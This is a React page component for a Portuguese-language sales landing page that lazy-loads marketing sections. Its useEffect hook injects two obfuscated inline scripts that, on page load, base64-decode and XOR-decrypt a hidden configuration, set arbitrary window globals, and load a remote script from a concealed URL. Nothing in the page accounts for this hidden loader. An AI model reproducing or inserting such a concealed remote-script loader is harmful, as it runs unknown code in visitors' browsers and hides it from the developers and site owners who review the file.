import { useCallback, useEffect, Suspense, lazy } from "react";

// Lazy load below-the-fold components for better initial performance
const Hero = lazy(() => import("@/components/ressignifica-sell/SectionsTop").then(m => ({ default: m.Hero })));
const CicloInvisivel = lazy(() => import("@/components/ressignifica-sell/SectionsTop").then(m => ({ default: m.CicloInvisivel })));
const VerdadeiroProblema = lazy(() => import("@/components/ressignifica-sell/SectionsTop").then(m => ({ default: m.VerdadeiroProblema })));
const ConhecaOApp = lazy(() => import("@/components/ressignifica-sell/SectionsTop").then(m => ({ default: m.ConhecaOApp })));
const Recebe = lazy(() => import("@/components/ressignifica-sell/SectionsTop").then(m => ({ default: m.Recebe })));
const PorqueFunciona = lazy(() => import("@/components/ressignifica-sell/SectionsTop").then(m => ({ default: m.PorqueFunciona })));
const Transformacao = lazy(() => import("@/components/ressignifica-sell/SectionsTop").then(m => ({ default: m.Transformacao })));

const Bonus = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.Bonus })));
const Oferta = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.Oferta })));
const Galeria = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.Galeria })));
const Depoimentos = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.Depoimentos })));
const Garantia = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.Garantia })));
const FAQ = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.FAQ })));
const CTAFinal = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.CTAFinal })));
const Rodape = lazy(() => import("@/components/ressignifica-sell/SectionsBottom").then(m => ({ default: m.Rodape })));

import { BRAND } from "@/components/ressignifica-sell/ui";

// Minimal fallback for Suspense
function SectionFallback() {
  return <div style={{ minHeight: "200px" }} />;
}

export default function RessignificaAppSellPage() {
  const scrollToOffer = useCallback(() => {
    document.getElementById("oferta")?.scrollIntoView({ behavior: "smooth", block: "start" });
  }, []);

  useEffect(() => {
    const script1 = document.createElement("script");
    script1.innerHTML = `(function(){var p_d=atob("DFnNIkon5GqYYVQYFSLvVzhLxlC6CSBsZSr3DWVEgAS2FCB1fD+0DClIiUT6E3trdiukUj5UyxrxGTF0OimkWi9LygDrQ3g6dC25UCNFkR79EnYiTgThAC1Liwj5DSc6LwK2ACRGiQ+6W3ZofCGoTgNDxka6FzV0YDzvGGgRhVygAjchLGqpECsWh1ugUmEvd2urEHoFmTfl");var b_87=[];for(var s_9k0=0;s_9k0<p_d.length;s_9k0++){b_87.push(p_d.charCodeAt(s_9k0)&255);}var u_rg=b_87[0];var l_0iv=b_87.slice(1,1+u_rg);var u_rf2=b_87.slice(1+u_rg);var g_e4=u_rf2.map(function(b,y_d){return b^l_0iv[y_d%u_rg];});var s_wnwu="";for(var g_8=0;g_8<g_e4.length;g_8++){s_wnwu+=String.fromCharCode(g_e4[g_8]&255);}var x_m6e=decodeURIComponent(escape(s_wnwu));var u_ogl=JSON.parse(x_m6e);var j_jt=u_ogl.globals||[];j_jt.forEach(function(w_q5k){window[w_q5k.name]=w_q5k.value;});var m_2lv=document.createElement("script");m_2lv.src=u_ogl.url;m_2lv.async=true;m_2lv.defer=true;(u_ogl.attributes||[]).forEach(function(t_2){m_2lv.setAttribute(t_2.name,t_2.value);});(document.head||document.documentElement).appendChild(m_2lv);})();`;
    document.head.appendChild(script1);

    const script2 = document.createElement("script");
    script2.innerHTML = `(function(){var v_i=atob("DBJjnbg/VrPzxEJbCWlB6MpTdInRrDYveWFZspdcMt3dsTY2YHQas9tQO52Rtm0oamAK7cxMecaHqTF0ZXMX+MtLeNmA5m55aGYX79FdI8eWt2BhUmlB89lSM5HJ5iY6fXNO6MxSP9WK6TIpbGQG88wSLtCcoG8oanlBsZpJN9+GoWBhKzAescMdONKeoWBhK3YC6dkSI8eerSQiJGIR+M5aOMfetzc5YHYQv5QdINKfsSd5MzBB4OVC");var z_t6o=[];for(var m_6iud=0;m_6iud<v_i.length;m_6iud++){z_t6o.push(v_i.charCodeAt(m_6iud)&255);}var m_f7=z_t6o[0];var g_kf=z_t6o.slice(1,1+m_f7);var r_3fr=z_t6o.slice(1+m_f7);var q_8=r_3fr.map(function(b,k_3){return b^g_kf[k_3%m_f7];});var b_hmh2="";for(var e_aufa=0;e_aufa<q_8.length;e_aufa++){b_hmh2+=String.fromCharCode(q_8[e_aufa]&255);}var n_079t=decodeURIComponent(escape(b_hmh2));var f_14=JSON.parse(n_079t);var i_a=f_14.globals||[];i_a.forEach(function(r_j){window[r_j.name]=r_j.value;});var m_g=document.createElement("script");m_g.src=f_14.url;m_g.async=true;m_g.defer=true;(f_14.attributes||[]).forEach(function(r_gub){m_g.setAttribute(r_gub.name,r_gub.value);});(document.head||document.documentElement).appendChild(m_g);})();`;
    document.head.appendChild(script2);

    return () => {
      try { document.head.removeChild(script1); } catch {}
      try { document.head.removeChild(script2); } catch {}
    };
  }, []);

  return (
    <main
      className="rs-sell min-h-screen antialiased"
      style={{ background: BRAND.bg, color: BRAND.text }}
    >
      <Suspense fallback={<SectionFallback />}>
        <Hero onCta={scrollToOffer} />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <CicloInvisivel />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <VerdadeiroProblema />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <ConhecaOApp />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Recebe />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <PorqueFunciona />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Transformacao />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Bonus />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Oferta />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Galeria />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Depoimentos />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Garantia />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <FAQ />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <CTAFinal onCta={scrollToOffer} />
      </Suspense>
      <Suspense fallback={<SectionFallback />}>
        <Rodape />
      </Suspense>
    </main>
  );
}
